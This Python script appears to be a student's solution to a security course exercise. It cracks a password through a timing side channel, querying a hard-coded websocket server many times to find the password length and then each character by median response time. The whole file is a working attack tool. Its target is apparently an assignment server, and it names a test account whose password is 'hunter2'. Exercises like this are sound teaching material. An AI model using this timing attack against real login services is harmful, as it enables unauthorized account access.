import asyncio
import websockets
import time
import string
import statistics
from json import dumps, loads
from time import sleep

# --- SERVER CONNECTION LOGIC (From client.py) ---

async def client_connect(username, password, variance=0.10):
    """Handles the websocket connection to the assignment server."""
    server_address = "ws://20.224.193.77:8080" # [cite: 22]
    
    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                await websocket.send(dumps([username, password, variance]))
                reply = await websocket.recv()
                return loads(reply)
        except Exception as error:
            # If a connection error occurs, wait 2 seconds and retry
            await asyncio.sleep(2)

def call_server(username, password, variance=0.001):
    """Wraps the async connection for synchronous use in the attack loop."""
    # Variance is kept low to ensure the server's internal delay is measurable
    reply = asyncio.run(client_connect(username, password, variance=0.001))
    # Mandatory sleep to prevent accidental DDoS [cite: 33, 34]
    sleep(0.001) 
    return reply

# --- ATTACK LOGIC ---

# The password consists only of lowercase letters and digits [cite: 23, 52]
CHARSET = string.ascii_lowercase + string.digits 

def get_stable_time(student_number, password):
    """
    Measures response time using a large sample size and the Median.
    The Median is resistant to random Wi-Fi lag spikes (outliers). 
    """
    # Increase SAMPLES to 150 if your Wi-Fi is very unstable
    SAMPLES = 150 
    times = []
    
    for _ in range(SAMPLES):
        start = time.perf_counter()
        call_server(student_number, password)
        end = time.perf_counter()
        times.append(end - start) # [cite: 41]
    
    return statistics.median(times)

def crack_password(student_number):
    print(f"--- Starting Attack on Student: {student_number} ---")
    
    # Step 1: Determine the password length [cite: 43, 44]
    # The server takes longer when the input length matches the actual length [cite: 19]
    best_length = 0
    max_delay = 0
    print("Detecting password length...")
    
    for length in range(1, 16): 
        t = get_stable_time(student_number, "a" * length)
        print(f"Testing length {length}: {t:.5f}s")
        if t > max_delay:
            max_delay = t
            best_length = length
            
    print(f">> Detected Length: {best_length}\n")

    # Step 2: Crack character by character [cite: 48, 51]
    # Each correct character increases the server's processing time [cite: 19]
    current_pw = list("a" * best_length)
    
    for i in range(best_length):
        char_results = []
        
        for char in CHARSET:
            current_pw[i] = char
            test_str = "".join(current_pw)
            t = get_stable_time(student_number, test_str)
            char_results.append((t, char))
        
        # Sort by time; the character that causes the longest delay is correct [cite: 19]
        char_results.sort(reverse=True)
        best_char = char_results[0][1]
        
        current_pw[i] = best_char
        print(f"Position {i}: '{best_char}' -> Current: {''.join(current_pw)}")
    
    final_password = "".join(current_pw)
    print(f"\n--- SUCCESS! Final Password: {final_password} ---")
    return final_password

if __name__ == "__main__":
    # Test with student 000000 first (password: hunter2) to verify the script [cite: 54, 80]
    target_student = "000000" 
    crack_password(target_student)